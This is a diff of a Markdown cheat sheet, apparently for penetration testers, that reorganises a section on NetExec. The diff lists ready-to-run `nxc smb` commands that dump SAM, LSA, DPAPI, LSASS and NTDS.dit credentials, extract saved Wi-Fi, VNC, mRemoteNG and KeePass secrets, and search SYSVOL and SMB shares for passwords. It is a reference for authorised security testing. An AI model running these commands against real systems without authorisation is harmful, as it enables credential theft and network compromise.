@@ -15,45 +15,90 @@
 ---
 
 ## NetExec 
-**NetExec** is a post‑exploitation framework that  provides modules to dump credentials from multiple sources, including the SAM database, LSA secrets, and NTDS.dit on Domain Controllers. It also integrates techniques for extracting credentials from LSASS memory and parsing application configuration files.
+**NetExec** is a post-exploitation framework that provides modules to dump credentials from multiple sources, including the SAM database, LSA secrets, DPAPI, LSASS memory, and the NTDS.dit database on Domain Controllers. It also includes modules to extract credentials stored by third-party applications and search for secrets within network shares.
 
-#### Core System Databases
+### Credential Extraction Modules
 
-- `--lsa`: Dumps LSA secrets (cached credentials, service account passwords, DPAPI keys).
+#### Windows Credentials
 
-```bash
-nxc smb <target_ip> -u <user> -p <password> --lsa
-```
-
-- `--sam`: Dumps local SAM database hashes.
+- `--sam`: Dumps local SAM database NTLM hashes.
 
 ```bash
 nxc smb <target_ip> -u <user> -p <password> --sam
 ```
 
-- `--ntds`: Dumps NTDS.dit database from a Domain Controller (domain user password hashes).
+- `--lsa`: Dumps LSA secrets (service account passwords, cached credentials, DPAPI system keys, DefaultPassword, etc.).
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> --lsa
+```
+
+- `--dpapi`: Dumps DPAPI master keys and decrypts stored credentials.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> --dpapi
+```
+
+- `-M lsassy`: Dumps credentials from LSASS memory.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> -M lsassy
+```
+
+- `--ntds`: Dumps the NTDS.dit database from a Domain Controller.
 
 ```bash
 nxc smb <dc_ip> -u <user> -p <password> --ntds
 ```
 
 
----
 
-#### Registry and Secrets
+#### Credential Stores
 
-- `--winlogon`: Retrieves Winlogon registry data (may contain autologon credentials).
-
-```bash
-nxc smb <target_ip> -u <user> -p <password> --winlogon
-```
-
-- `--dpapi`: Dumps DPAPI credentials and master keys.
+- `-M masky`: Abuses PKINIT/Kerberos to retrieve credentials in supported environments.
 
 ```bash
-nxc smb <target_ip> -u <user> -p <password> --dpapi
+nxc smb <target_ip> -u <user> -p <password> -M masky
 ```
 
+- `-M wifi`: Extracts saved Wi-Fi profiles and passwords.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> -M wifi
+```
+
+- `-M mremoteng`: Extracts saved mRemoteNG credentials.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> -M mremoteng
+```
+
+- `-M vnc`: Extracts stored VNC passwords.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> -M vnc
+```
+
+- `-M keepass_discover`: Searches the filesystem for KeePass databases.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> -M keepass_discover
+```
+
+
+#### Group Policy & File Discovery
+
+- `-M gpp_password`: Searches SYSVOL for Group Policy Preference (`cpassword`) credentials.
+
+```bash
+nxc smb <dc_ip> -u <user> -p <password> -M gpp_password
+```
+
+- `-M spider_plus`: Recursively enumerates SMB shares and indexes files that may contain credentials, scripts, configuration files or other sensitive information.
+
+```bash
+nxc smb <target_ip> -u <user> -p <password> -M spider_plus
+```
 
 ---
 
